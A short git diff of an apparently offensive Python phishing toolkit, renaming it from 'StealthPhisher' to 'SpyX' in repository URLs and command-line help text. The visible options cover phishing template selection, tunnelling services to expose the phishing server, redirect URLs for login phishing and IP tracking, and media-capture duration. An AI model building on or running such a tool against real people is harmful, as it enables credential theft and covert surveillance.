@@ -182,8 +182,8 @@ cprint = Console().print
 # Get Columns of Screen
 columns = get_terminal_size().columns
 
-repo_url = "https://github.com/TheBizarreAbhishek/StealthPhisher"
-sites_repo = "https://github.com/TheBizarreAbhishek/StealthSites"
+repo_url = "https://github.com/TheBizarreAbhishek/SpyX"
+sites_repo = "https://github.com/TheBizarreAbhishek/SpyX"
 repo_branch = "StealthSites-main"
 websites_url = "https://github.com/TheBizarreAbhishek/StealthSites/blob/main/websites.zip"
 # CF = Cloudflared, LX = LocalXpose, LHR = LocalHostRun, #SVO = Serveo
@@ -249,9 +249,9 @@ else:
 
 argparser = ArgumentParser()
 
-argparser.add_argument("-p", "--port", type=int, default=default_port, help=f"StealthPhisher's server port [Default : {default_port}]")
-argparser.add_argument("-t", "--type", help="StealthPhisher's phishing type index [Default : null]")
-argparser.add_argument("-o", "--option", help="StealthPhisher's template index [ Default : null ]")
+argparser.add_argument("-p", "--port", type=int, default=default_port, help=f"SpyX's server port [Default : {default_port}]")
+argparser.add_argument("-t", "--type", help="SpyX's phishing type index [Default : null]")
+argparser.add_argument("-o", "--option", help="SpyX's template index [ Default : null ]")
 argparser.add_argument("-T", "--tunneler", default=default_tunneler, help=f"Tunneler to be chosen while url shortening [Default : {default_tunneler}]")
 argparser.add_argument("-r", "--region", help="Region for loclx [Default: auto]")
 argparser.add_argument("-S", "--subdomain", help="Subdomain for loclx [Pro Account] (Default: null)")
@@ -260,7 +260,7 @@ argparser.add_argument("-f", "--fest", default=default_fest, help=f"Festival nam
 argparser.add_argument("-i", "--ytid", default=default_ytid, help=f"Youtube video ID for yttv template [Default : {default_ytid} (NASA Video)]")
 argparser.add_argument("-u", "--url", help="Redirection url for ip-tracking or login phishing [Default : null]")
 argparser.add_argument("-s", "--duration", type=int, default=default_duration, help=f"Media duration while capturing [Default : {default_duration}(ms)]")
-argparser.add_argument("-m", "--mode", help="Mode of StealthPhisher [Default: normal]")
+argparser.add_argument("-m", "--mode", help="Mode of SpyX [Default: normal]")
 argparser.add_argument("-e", "--troubleshoot", help="Troubleshoot a tunneler [Default: null]")
 argparser.add_argument("--nokey", help="Use localtunnel without ssh key [Default: False]", action="store_false")
 argparser.add_argument("--kshrt", help="Show kshrt url [Default: False]", action="store_true")
